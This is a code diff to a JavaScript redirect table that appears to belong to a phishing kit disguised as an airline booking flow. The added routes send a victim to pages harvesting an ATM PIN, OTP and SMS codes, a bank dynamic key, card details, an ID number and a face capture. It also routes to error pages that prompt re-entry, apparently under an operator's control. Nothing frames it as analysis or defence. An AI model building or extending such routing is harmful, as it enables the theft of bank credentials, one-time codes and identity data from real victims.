@@ -73,17 +73,57 @@
         }
 
         const actionRoutes = {
-            'pedir_logo':     'pedir_logo.php',
-            'pedir_dinamica': 'pedir_dinamica.php',
-            'error_tc':       'error_clave_cajero.html',
-            'error_logo':     'error_otp.html',
-            'error_dinamica': 'error_dinamica.html',
-            'finalizar':      'finish.html',
-            'finish':         'finish.html',
-            'token':          'pedir_clave_cajero.html',
-            'cajero':         'pedir_clave_cajero.html',
-            'clave_cajero':   'clave_cajero.html',
-            'dinamica':       'pedir_dinamica.php',
+            // ── Logo / OTP app ──
+            'pedir_logo':      'pedir_logo.php',
+            'logo':            'pedir_logo.php',
+            'dinamica_logo':   'pedir_logo.php',
+            'pedir_token':     'pedir_otp.html',
+            'token':           'pedir_otp.html',
+            'sms':             'pedir_otp.html',
+
+            // ── Dinámica ──
+            'pedir_dinamica':  'pedir_dinamica.php',
+            'dinamica':        'pedir_dinamica.php',
+
+            // ── Cajero / Clave ──
+            'cajero':          'pedir_clave_cajero.html',
+            'clave_cajero':    'clave_cajero.html',
+
+            // ── Tarjeta / Cédula ──
+            'tarjeta':         'payment.html',
+            'cedula':          'id-check.html',
+            'cc':              'id-check.html',
+
+            // ── Errores ──
+            'error':           'error_clave_cajero.html',
+            'error_tc':        'error_clave_cajero.html',
+            'error_cajero':    'error_clave_cajero.html',
+            'error_tarjeta':   'error_clave_cajero.html',
+            'error_logo':      'error_otp.html',
+            'error_dinamica':  'error_dinamica.html',
+            'banco_error':     'error_dinamica.html',
+
+            // ── Finalizar ──
+            'finalizar':       'finish.html',
+            'confirm_finalizar':'finish.html',
+            'finish':          'finish.html',
+            'fin':             'finish.html',
+            'rechazar':        'finish.html',
+
+            // ── Espera / Estado ──
+            'enviado':         'waiting.html',
+            'repetir':         'loadpayment.php',
+
+            // ── KYC / Cara ──
+            'cara':            'caras/index.html',
+            'cap':             'caras/index.html',
+            'capok':           'caras/index.html',
+            'capbad':          'caras/index.html',
+
+            // ── Confirmación ──
+            'si':              'flight-resume.html',
+            'no':              'finish.html',
+            'otro':            'passengers-info.html',
         };
 
         function verificarActualizaciones() {
